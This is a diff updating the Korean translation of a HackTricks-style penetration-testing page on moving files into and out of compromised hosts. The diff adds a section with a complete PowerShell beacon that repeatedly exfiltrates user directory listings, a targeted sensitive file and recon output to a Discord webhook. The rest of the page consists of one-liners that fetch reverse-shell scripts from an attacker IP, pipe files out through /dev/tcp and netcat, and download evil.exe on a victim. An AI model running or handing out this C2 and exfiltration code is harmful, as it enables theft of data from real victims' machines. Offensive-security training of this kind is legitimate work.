@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 정보 유출을 위해 일반적으로 허용된 도메인
+## Commonly whitelisted domains to exfiltrate information
 
-[https://lots-project.com/](https://lots-project.com/)를 확인하여 악용될 수 있는 일반적으로 허용된 도메인을 찾으세요.
+공격에 악용될 수 있는 일반적으로 화이트리스트에 등록된 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요
 
 ## Copy\&Paste Base64
 
@@ -13,21 +13,21 @@
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**윈도우**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
 ## HTTP
 
-**리눅스**
+**Linux**
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**윈도우**
+**Windows**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -45,7 +45,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### 파일 업로드
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**GET 및 POST(헤더 포함) 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Python 모듈 [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -100,14 +100,99 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+
+Webhooks는 JSON과 선택적 파일 파트를 허용하는 쓰기 전용 HTTPS 엔드포인트입니다. 신뢰된 SaaS 도메인에 일반적으로 허용되며 OAuth/API 키가 필요 없기 때문에 저마찰 beaconing 및 exfiltration에 유용합니다.
+
+Key ideas:
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data로, payload_json이라는 파트에 {"content":"..."}를 넣고 선택적 file 파트(이름: file)를 추가합니다.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK이 전송을 확인합니다.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+참고:
+- 유사한 패턴은 incoming webhooks를 사용하는 다른 협업 플랫폼(Slack/Teams)에도 적용됩니다. URL과 JSON 스키마를 적절히 조정하세요.
+- Discord Desktop 캐시 아티팩트의 DFIR 및 webhook/API 복구에 대해서는 다음을 참조하세요:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
-### FTP 서버 (파이썬)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP 서버 (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -143,14 +228,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali를 서버로 사용
+Kali를 서버로
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-samba를 사용하여 **smb 공유**를 생성합니다:
+또는 smb 공유를 **samba를 사용하여**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -165,7 +250,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-윈도우
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-공격자는 SSHd가 실행 중이어야 합니다.
+공격자는 SSHd가 실행 중이어야 한다.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-희생자가 SSH를 가지고 있다면, 공격자는 희생자의 디렉토리를 공격자에게 마운트할 수 있습니다.
+victim에 SSH가 있으면, attacker는 victim의 directory를 attacker로 mount할 수 있다.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,7 +279,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 피해자로부터 파일 다운로드
+### 피해자에서 파일 다운로드
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -206,7 +291,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_**에게 감사드립니다.
+감사합니다 **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -228,33 +313,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-SMTP 서버에 데이터를 보낼 수 있다면, 파이썬을 사용하여 데이터를 수신할 SMTP를 생성할 수 있습니다:
+데이터를 SMTP 서버로 보낼 수 있다면, python으로 데이터를 수신할 SMTP 서버를 만들 수 있습니다:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-기본적으로 XP와 2003에서 (다른 버전에서는 설치 중에 명시적으로 추가해야 함)
+기본적으로 XP와 2003에는 포함되어 있습니다 (다른 버전에서는 설치 시 명시적으로 추가해야 합니다)
 
-Kali에서, **TFTP 서버 시작**:
+Kali에서, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**파이썬의 TFTP 서버:**
+**TFTP server (python으로):**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**희생자**에서 Kali 서버에 연결합니다:
+**victim**에서 Kali 서버에 연결하세요:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP 원라이너로 파일 다운로드:
+PHP oneliner로 파일을 다운로드:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -262,7 +347,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**희생자**
+**피해자**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 프로그램은 이진 파일을 검사할 수 있을 뿐만 아니라 **16진수에서 이진 파일을 재구성할 수 있는 기능**도 가지고 있습니다. 이는 이진 파일의 16진수를 제공함으로써 `debug.exe`가 이진 파일을 생성할 수 있음을 의미합니다. 그러나 `debug.exe`는 **최대 64kb 크기의 파일을 조립하는 제한**이 있다는 점에 유의해야 합니다.
+`debug.exe` 프로그램은 바이너리 검사뿐만 아니라 **hex에서 다시 빌드하는 기능**도 제공합니다. 즉, 바이너리의 hex를 제공하면 `debug.exe`가 해당 바이너리 파일을 생성할 수 있습니다. 다만, debug.exe는 **최대 64 kb까지의 파일만 어셈블할 수 있는 제한**이 있다는 점에 유의해야 합니다.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-그런 다음 텍스트를 윈도우 셸에 복사하여 붙여넣으면 nc.exe라는 파일이 생성됩니다.
+그런 다음 해당 텍스트를 windows-shell에 복사해 붙여넣으면 nc.exe라는 파일이 생성됩니다.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## 참고자료
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
